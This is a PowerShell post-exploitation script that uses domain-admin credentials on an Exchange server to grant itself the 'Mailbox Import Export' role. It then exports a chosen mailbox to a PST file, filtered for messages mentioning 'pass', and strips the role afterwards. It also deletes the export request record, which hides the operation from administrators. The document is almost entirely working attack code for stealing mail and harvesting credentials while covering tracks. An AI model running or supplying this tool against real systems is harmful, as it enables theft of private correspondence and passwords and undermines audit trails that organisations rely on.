function UsePSSessionToExportMailfromExchange
{
#Requires -Version 2.0
<#
.SYNOPSIS
This script will export the mail(.pst) from the Exchange server.
First it will use PSSession to connect the Exchange server.
Then it'll check the user's privilege.
If the user is not in the "Mailbox Import Export",the script will add the user to it.
Next it will export the mail and save it.
At last it will remove the user from the group and remove the PSSession.

Author: 3gstudent

.PARAMETER User
The user to use.
In general, you can choose the account in the domain admins.

.PARAMETER Password
The password of the user.

.PARAMETER MailBox
The mail you want to export.

.PARAMETER ExportPath
The export path of the mail.

.PARAMETER ConnectionUri
The uri of the Exchange server.
Eg.
    http://Exchange01.test.com/PowerShell/
    
.PARAMETER $Filter

The search filter of the mail.

.EXAMPLE
PS C:\> UsePSSessionToExportMailfromExchange -User "administrator" -Password "DomainAdmin123!" -MailBox "test1" -ExportPath "\\Exchange01.test.com\c$\test\" -ConnectionUri "http://Exchange01.test.com/PowerShell/" -Filter "{`"(body -like `"*pass*`")`"}"
#>
 	param (
        [Parameter(Mandatory = $True)]
		[string]$User,
        [Parameter(Mandatory = $True)]
		[string]$Password,
        [Parameter(Mandatory = $True)]
		[string]$MailBox,
        [Parameter(Mandatory = $True)]
		[string]$ExportPath,
        [Parameter(Mandatory = $True)]
		[string]$ConnectionUri,
        [Parameter(Mandatory = $True)]
		[string]$Filter
	)
    Write-Host "[>] Start to Import-PSSession" 
    #Import-PSSession
    $Pass = ConvertTo-SecureString -AsPlainText $Password -Force
    $Credential = New-Object System.Management.Automation.PSCredential -ArgumentList $User,$Pass
    $Session = New-PSSession -ConfigurationName Microsoft.Exchange -ConnectionUri $ConnectionUri -Authentication Kerberos -Credential $Credential
    Import-PSSession $Session -AllowClobber| Out-Null

    Write-Host "[>] Start to check user"
    #check user
    if(Get-ManagementRoleAssignment ("Mailbox Import Export-"+$User) -ErrorAction SilentlyContinue) 
    {
    	Write-Host "[!] The specified user already exists.No need to add it to the group" 
    }
    else
    {
    	Write-Host "[+] Start to add user" 
    	#Add user
    	New-ManagementRoleAssignment –Role "Mailbox Import Export" –User $User| Out-Null
    }
    Write-Host "[+] Start to export mail" 
    #Export mail and do not save the export request
    New-MailboxexportRequest -mailbox $MailBox -ContentFilter {(body -like "*pass*")} -FilePath ($ExportPath+$MailBox+".pst") -CompletedRequestAgeLimit 0
    Write-Host "[>] Start to remove user"
    #Remove user
    Get-ManagementRoleAssignment ("Mailbox Import Export-"+$User) |Remove-ManagementRoleAssignment -Confirm:$false
    Write-Host "[>] Start to Remove-PSSession"
    #Remove Remove-PSSession $Session
    Remove-PSSession $Session
    Write-Host "[+] All done."
}
